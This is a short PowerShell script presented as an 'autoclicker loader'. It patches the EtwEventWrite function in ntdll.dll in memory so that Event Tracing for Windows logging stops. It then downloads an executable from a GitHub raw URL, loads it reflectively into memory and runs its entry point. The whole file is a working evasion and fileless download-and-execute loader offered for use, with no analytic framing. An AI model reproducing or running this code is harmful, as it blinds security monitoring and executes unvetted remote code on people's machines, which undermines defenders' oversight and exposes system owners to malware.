# Autoclicker Loader with ETW Patching (No Event Viewer Logs)

try {
    # 1. Patch ETW first (prevents PowerShell logging)
    Write-Host "[*] Patching ETW..." -ForegroundColor Gray
    
    # Add Win32 APIs for memory patching
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    
    # Patch EtwEventWrite function
    $ntdll = [Win32]::LoadLibrary("ntdll.dll")
    $etwEventWrite = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
    
    if ($etwEventWrite -ne [IntPtr]::Zero) {
        $oldProtect = 0
        if ([Win32]::VirtualProtect($etwEventWrite, [UIntPtr]::new(4), 0x40, [ref]$oldProtect)) {
            # Patch with RET instruction (0xC3) - makes ETW do nothing
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 0, 0xC3)
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 1, 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 2, 0x00)
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 3, 0x00)
            
            # Restore protection
            [Win32]::VirtualProtect($etwEventWrite, [UIntPtr]::new(4), $oldProtect, [ref]$oldProtect) | Out-Null
            
            Write-Host "[+] ETW patched - No Event Viewer logs" -ForegroundColor Green
        }
    }
    
    # 2. Your original script
    Write-Host "[*] Downloading autoclicker..." -ForegroundColor Gray
    $bytes = (Invoke-WebRequest "https://github.com/angelsegg/tttt/raw/refs/heads/main/autoclicker.exe" -UseBasicParsing).Content
    
    Write-Host "[*] Loading into memory..." -ForegroundColor Gray
    $asm = [System.Reflection.Assembly]::Load($bytes)
    
    Write-Host "[*] Executing..." -ForegroundColor Gray
    $asm.EntryPoint.Invoke($null, @([string[]]@()))
    
    Write-Host "[+] Autoclicker running!" -ForegroundColor Green
    Write-Host "[!] No Event Viewer logs (ETW patched)" -ForegroundColor Yellow
    
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
}
